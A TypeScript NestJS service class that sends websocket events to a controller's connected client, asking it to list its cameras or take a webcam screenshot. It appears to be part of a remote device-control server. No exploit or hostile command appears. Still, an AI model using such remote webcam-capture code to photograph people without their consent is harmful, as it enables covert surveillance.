import { LoggerService } from "@/src/modules/shared/providers";
import { Injectable, Logger, StreamableFile } from "@nestjs/common";
import {
    GetFileDto,
    SendFileToClientDto,
} from "../../infrastructure/routes/dto/controller.dto";
import { ControllerRepository } from "@/src/repository/db/controller/controller.repository";
import { WsClientFile } from "@/src/modules/ws-client/application/events/ws-client-file";
import { WsBotRepository } from "@/src/modules/ws-bot/domain/ws-bot.repository";
import Crypto from "node:crypto";
import { generateRandomHash } from "@/src/utils";
import { WsClientGateway } from "@/src/modules/ws-client/infrastructure/ws-client.gateway";
@Injectable()
export class CamerasUseCase {
    private logger = new Logger("CamerasUseCase");
    constructor(
        // private readonly logger: LoggerService,
        private readonly controllerRepository: ControllerRepository,
        private readonly wsClientGateway: WsClientGateway,
    ) { }

    async getCameras(
        controllerid: string,
        identifier: string
    ) {

        const activeclient = (
            await this.controllerRepository.getControllerById(controllerid)
        ).activeclient;

        if (!activeclient) {
            if (!activeclient) {
                this.logger.error("No active client found");
                return;
            }
        }

        this.wsClientGateway.sendEventToClient(activeclient, "getCameras", {
            identifier,
        })

        return { status: true }
    }

    async takeScreenshot(
        controllerid: string,
        webcamId: string,
    ) {

        const activeclient = (
            await this.controllerRepository.getControllerById(controllerid)
        ).activeclient;

        if (!activeclient) {
            if (!activeclient) {
                this.logger.error("No active client found");
                return;
            }
        }

        this.wsClientGateway.sendEventToClient(activeclient, "screenshotWebcam", {
            webcamId,
        })

    }

}
